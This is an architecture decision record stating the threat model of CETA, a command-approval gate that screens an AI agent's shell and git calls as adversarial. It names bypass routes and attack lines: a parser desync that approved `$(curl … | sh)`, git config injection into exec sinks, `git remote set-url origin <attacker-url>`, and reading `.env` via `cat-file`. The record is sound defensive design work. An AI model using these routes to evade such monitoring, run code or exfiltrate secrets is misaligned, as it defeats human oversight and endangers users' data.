# CETA threat model: agent-as-adversary, repo trusted, command-line config injection screened

**Status**: Accepted
**Date**: 2026-08-18
**Deciders**: Phillip Green II

## Context

CETA (`packages/claude-extended-tool-approver/`) has never had a threat-model document. Its trust
boundary is real, consistent, and load-bearing, but until now it existed only as scattered rule
prose and two ADRs' Context sections — inferable, never stated. The clearest symptom is
`internal/cmdparse/parser.go`'s `gitReadSubcommands` doc comment (the admission test for the
substitution-body read-only allowlist), whose "THE pg2-a5r9r RULING" section carries the package's
only written statement of the boundary, buried inside one allowlist's rationale:

> CETA'S THREAT MODEL DOES NOT TREAT THE REPO AS HOSTILE, so nothing else in the package is
> relying on this criterion. `patheval` reports the project/CWD `PathReadWrite`; ADR 0041's Context
> names that trust as the cause of a false-allow rather than as a mistake to undo; ADR 0040's
> Context bounds its own scope with "this is not a remote-attacker vector". `primarycommit`'s
> resolver reads repo-local `.git/config` and TRUSTS it to name the primary branch.

That statement is correct — this ADR confirms every clause of it against current source below —
but a package-wide invariant stated inside one criterion's rationale is exactly the shape that
rots: a reader working on any _other_ rule has no reason to find it there, and it cites two ADRs'
Context sections as if a Context were the right place to hold a standing invariant.

Its absence already cost a full investigation once. `pg2-a5r9r` existed only because
`gitReadSubcommands`' criterion 3 declined `git ls-files` for a property two incumbent members
(`status`, `describe --dirty`) also had; settling it required measuring, from scratch, whether the
`core.fsmonitor` path is attacker-reachable at all and whether a hostile _repo_ could arm it. With a
stated boundary that question is a lookup, not a measurement campaign. `pg2-a12rl` — the unscreened
`GIT_CONFIG_*` env route to the same sink, filed while working `pg2-a5r9r` — was exactly this kind
of boundary question; it has since landed (`4da9092e`, closing `hasGitConfigEnvInjection` as a
key-blind demotion in `internal/rules/git/git.go`), which is itself evidence that "where does the
boundary sit" is a recurring question this doc should make cheap to answer, not a one-off.

## Decision

### 1. Who is the adversary

**In scope: the agent itself** — whatever is driving Bash calls through CETA (an LLM tool loop, a
script it wrote, a subprocess it launched). CETA's job is to stop _that_ actor from doing
irreversible damage or leaking secrets through a command it constructs, not to defend against a
party outside the agent's own action.

**Explicitly out of scope:**

- **A hostile remote attacker.** ADR 0040's Context states this in as many words — "Scope is
  bounded to what a consumer put in its own `rules.json`, so this is not a remote-attacker
  vector" — about the `approvedCommands` allowlist, and the same framing holds for the git rule's
  admission criteria: nothing in `gitReadSubcommands` or `readOnlySubcommands` is arguing about a
  network attacker.
- **A hostile checkout, as an independent threat.** The repo and CWD are trusted (see "What is
  trusted vs. what is screened" below). A checkout can certainly be adversarial in principle, but
  CETA does not model it as a distinct attacker with its own defenses — it is folded into the same
  one it does defend against, because the reachable paths from a hostile checkout to actual harm
  all route back through the agent running a command (the content-emission-vs-index-consultation
  asymmetry below is precisely about which of those paths need no agent action at all, and it is
  exactly one: content disclosure via `git show`).
- **A compromised dependency, CETA's own classifier, or the platform underneath it (git, the
  shell, the OS).** CETA's rules assume git and the shell behave as documented; it has no defense
  against a git binary that lies.

### 2. What is trusted vs. what is screened

**Trusted** — state that already exists, was not introduced by this call, and is treated as part
of the environment rather than as adversary input:

- **The CWD / project tree.** `patheval.PathEvaluator` classifies the project directory and CWD as
  `PathReadWrite` (`internal/patheval/evaluator_test.go` pins this) — the working tree is writable
  by design, not fenced off as untrusted. ADR 0041's Context leans on exactly this trust to explain
  a false-allow (an agent write to `.claude/settings.local.json` was approved because the project
  subtree is writable) and frames it as a consequence to live with, not a mistake to undo — ADR
  0041's Decision closes the specific `.claude/` gap without retracting the underlying CWD trust.
- **Repo-local `.git/config`.** `primarycommit.FileResolver.PrimaryBranch`
  (`internal/rules/primarycommit/resolver.go`) reads `.git/config`'s
  `pgii-integrate-branch.primaryBranch` key directly off disk and returns it as the trusted answer
  to "what is this repo's primary branch" — no cross-check, no repo-content skepticism.
- **`.gitattributes`.** It is clone-transferred and read as ordinary repo content; see "The
  content-emission-vs-index-consultation asymmetry" below for why that is safe on its own.
- **Files the agent already wrote in this session or earlier.** Nothing in CETA treats a
  previously-written file with more suspicion than one that was always there.
- **The user's global git config** (`~/.gitconfig`, `~/.config/git/config`, `GIT_CONFIG_SYSTEM`
  defaults) — read the same way as repo-local config, with no distinct screening.

**Screened** — a value the agent is introducing _in this command_, on the command line or via an
environment assignment it controls, rather than state that was already sitting in the repo or the
user's own config:

- **Pre-subcommand `git -c` / `--config-env`.** `hasGitConfigInjection`
  (`internal/rules/git/git.go`) treats every pre-subcommand `-c` as a floor unless its
  `(key, value)` pair is in `clearedConfigFlagPairs`; `--config-env` is unconditional (its value
  comes from an environment variable name, not visible command text).
- **The `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_n` / `GIT_CONFIG_VALUE_n` triple, `GIT_CONFIG`,
  `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_PARAMETERS`, `GIT_CONFIG_NOSYSTEM`.**
  `hasGitConfigEnvInjection` (same file) screens the whole `GIT_CONFIG*` family, key-blind, as the
  env-route twin of `-c`.
- **A `git config` _write_ to a key in `gatedConfigKeys`** (`core.fsmonitor`, `core.hooksPath`,
  `diff.external`, `credential.helper`, `url.<base>.insteadOf`, and the rest of that table) — the
  agent authoring NEW repo-local config that a _later_ command will trust, which is the same hazard
  approached from the write side instead of the read side.

The distinguishing question for any value CETA's git rule inspects is not "does this touch the
repo" but **"did the agent just introduce this on the command line / environment for this call, or
was it already sitting in state CETA treats as part of the environment?"** State already in the
repo (or the user's own global config) is trusted; the agent introducing new config to reach an
exec sink _during this call_ is not. A rule author extending either table should ask which side of
that line a new value falls on, not whether it is "in the repo" in some looser sense.

### 3. What CETA actually protects

The rules in this package answer three different questions, and reading any one rule's verdict as
addressing all three is a mistake CETA's own tables warn against:

- **Preventing destructive or irreversible actions.** `pushVerdict`'s Reject on every force-push
  spelling (`--force`, `-f`, a clustered `-f…`, a `+`-refspec prefix — "an agent must never
  force-push", operator ruling 2026-07-30) and on `--mirror` (deletes every remote ref absent
  locally); `receive.denyCurrentBranch`'s `configInterlock` classification (its default refusal is
  what stops a push from silently rewriting a live worktree's checked-out branch).
- **Preventing secret exfiltration.** `remoteVerdict`'s hard Reject on `git remote set-url` and
  `pushVerdict`'s Reject on pushing straight to a URL are, by the rule's own doc comment, reasoned
  as exfiltration control specifically — "THE RATIONALE IS EXFILTRATION … `git remote set-url
origin <attacker-url>` turns every later, entirely ordinary-looking `git push origin main` into a
  send to another host, with nothing at the push site to show for it" — not as guards against an
  undoable action; `cat-file`'s decline (`gitReadSubcommands`' DECLINED CANDIDATES) is the same
  protection from the read side: `-p HEAD:.env` can print a secret's bytes from a `<rev>:<path>`
  spec the `secretpath` screen cannot see, because that screen inspects argv _paths_, not object
  specifiers.
- **Preventing arbitrary code execution.** The whole `configSink` class in `gatedConfigKeys`
  (`core.hooksPath`, `core.pager`, `core.fsmonitor`, `diff.<driver>.textconv`, `diff.external`,
  `core.sshCommand`, `core.askPass`, the alternate-transport family) and `hasGitConfigInjection`'s
  floor are this: git spawning a caller-named program.

**The rules currently blend these**, and this ADR does not attempt to un-blend them — that is a
larger redesign this bead is not scoped for. What it does is name the three so a rule author can
say _which_ of them a new admission or gate argument is actually defending, instead of arguing from
an undifferentiated "this is dangerous." The `remoteVerdict`/`pushVerdict` pair above is the
clearest example of the blend already happening: a hard Reject on an action that cannot be
un-done reads, from the verdict alone, like a destructiveness guard, and only the rule's own
comment discloses that the actual reasoning is exfiltration — a rule author who judged it by
verdict shape rather than by reading the rationale would categorize it wrong. `cat-file` blends
two of the three the other way: it fails on exfiltration risk _and_ is declined for the same
textconv/RCE reason `show`/`log`/`diff-tree` are (`gitReadSubcommands` criterion 1/2). And
`core.fsmonitor` is an RCE sink at the porcelain-write layer (`gatedConfigKeys`) whose
_reachability from a hostile repo_ was the question `pg2-a5r9r` had to settle empirically (see "The
content-emission-vs-index-consultation asymmetry" below) — a fact about the RCE protection, not
about exfiltration or destructiveness, even though the measurement was framed around a read-only
allowlist.

### 4. What "fail-closed" means relative to this adversary

CETA's canonical fail-closed case is `pg2-wguam`: an unbalanced quote inside an unquoted heredoc
body nested in a command substitution desynced the shell scanner, dropped the substitution extent
entirely, and skipped both `engine.heredocFloor()` and `evaluateHeredocBodies()` — auto-approving a
live `$(curl … | sh)`. The fix direction, stated on that bead and upheld in
`internal/engine/engine.go`'s `heredocFloor`/`unparseableExpressionFloor`, is that an
unparseable-or-desynced construct MUST yield `NoOpinion`/`Abstain` (deferring to Claude Code's own
prompt), never `Approve`.

Read against the adversary named in "Who is the adversary" above, "fail-closed" here means: **when
CETA's own parser cannot determine what a command does, the agent — the party CETA does not trust
to have constructed an innocuous command — does not get the benefit of the doubt.** It is not
failing closed against a
hostile repo (nothing about heredoc-scanner desync is repo state) and not against a remote
attacker; it is failing closed against the possibility that the ambiguity itself is exactly the
gap the agent's command was shaped to exploit, whether or not that shaping was deliberate. Every
other floor in the package with the same shape — `heredocFloor` on any heredoc/herestring-bearing
leaf, the trailing bare `-c` case in `hasGitConfigInjection` ("a trailing `-c` with nothing after
it has no pair to inspect, so it fails closed") — is the identical move: an input CETA cannot
positively classify defers to the human/classifier layer rather than resolving to `Approve`.

### 5. The content-emission-vs-index-consultation asymmetry (forward guidance)

This is the concrete rule for any future allowlist-admission argument, and it is the finding
`pg2-a5r9r` produced by measurement (git 2.54.0, 2026-08-13):

**Content emission has a config-free execution path. Index consultation does not.**

- `git show HEAD:f` prints an object's raw bytes with system and global config neutralised — no
  config lookup is needed to emit content at all. Inside a command substitution those bytes
  become the _outer_ command's argv, which is why `gitReadSubcommands` criterion 1 (no content
  emission) survives on a disclosure leg even after the RCE leg it originally cited was narrowed.
- By contrast, index consultation (`git status`, `git describe --dirty`, `git ls-files -m` and
  other stat-comparing spellings) has no such config-free leg: the moment git compares the index
  against the worktree it may consult `core.fsmonitor`, a config value naming a program git
  executes.

**Why this settles more than it looks like it does — the reachability half.** The naive worry
("`core.fsmonitor` is attacker-reachable, so anything that touches the index is as dangerous as
`show`/`log`") is wrong because of _how_ `core.fsmonitor` and its sibling sinks (`diff.<driver>
.textconv`, `diff.external`) can actually be armed:

- `git clone` does **not** transfer `.git/config`. Measured: a clone of a repo with both
  `core.fsmonitor` and a `diff.<driver>.textconv` set carried **neither** key. A hostile upstream
  therefore cannot ship either sink via an ordinary clone.
- `.gitattributes` **is** clone-transferred, but naming an undefined diff driver executes nothing —
  git falls back to the builtin diff. The _program name_ still has to come from config, which a
  clone does not carry. So `.gitattributes` alone is not sufficient for execution; it is inert
  without a config source the clone did not bring.

So `core.fsmonitor`'s reachability-from-a-hostile-repo is in the **same class** as the RCE leg
criterion 1 was originally written to guard (a config-named program, not shippable by clone), not a
stricter one — which is exactly why `gitReadSubcommands` criterion 3 does not, by itself, disqualify
a candidate. It also does not clear a candidate on its own: the "Screened" list above (`-c`,
`--config-env`, `GIT_CONFIG*`) is what actually stops an _agent_ from arming that sink during the
current call, and that screening happens where it belongs — at the argv/env layer in
`internal/rules/git/git.go` — not inside this allowlist.

**The illustration that makes the asymmetry concrete** — the one future admission arguments should
reason from directly: `pg2-a5r9r` measured what removing `status` and `describe` from
`gitReadSubcommands` (the _substitution-body_ floor) would actually buy, given that the git rule's
own `readOnlySubcommands` (`internal/rules/git/git.go`) separately approves the _bare_ spellings of
both. Against a binary built with both entries deleted from `gitReadSubcommands`, exactly two
shapes moved — `echo "$(git status --porcelain)"` and `echo "$(git describe --dirty)"`, from
`allow` to `abstain` — while the bare, unwrapped `git status` and `git describe --dirty` still
answered `allow` on both the before and after binaries. **Tightening the substitution-body floor
while the bare spelling stays approved by the rule's own read-only table mitigates nothing**: the
same subcommand, unwrapped, still reaches `core.fsmonitor`. A future allowlist-admission argument
that tightens one seam without checking whether a sibling seam approves the identical bare command
is arguing about optics, not about closing a reachable path — the question to ask is always
"does _any_ remaining approved spelling still reach the sink", not "does this one table's entry
look consistent."

## Consequences

- `internal/cmdparse/parser.go`'s `gitReadSubcommands` comment no longer carries the package-wide
  threat-model claim itself; it cites this ADR's "What is trusted vs. what is screened" instead.
  Rot risk moves to one place instead of two.
- A rule author facing a new allowlist-admission question can answer "is this reachable from a
  hostile repo" by checking whether the sink's config source is clone-transferred (see "The
  content-emission-vs-index-consultation asymmetry") instead of re-running `pg2-a5r9r`'s
  measurement campaign, and can answer "which protection am I actually arguing for" via "What CETA
  actually protects"'s three-way split.
- This ADR does not unify the destructive/exfiltration/RCE distinction into separate rule chains —
  that remains future work if it is ever done at all. It only names the three so they stop being
  silently blended in argument.
- `pg2-a12rl`'s closure (the `GIT_CONFIG*` env route) is folded into "What is trusted vs. what is
  screened"'s screened list rather than left as an open example, since it landed (`4da9092e`)
  before this ADR was written; the boundary this ADR states is the one that closure resolved
  _toward_, not a description of a gap still open.
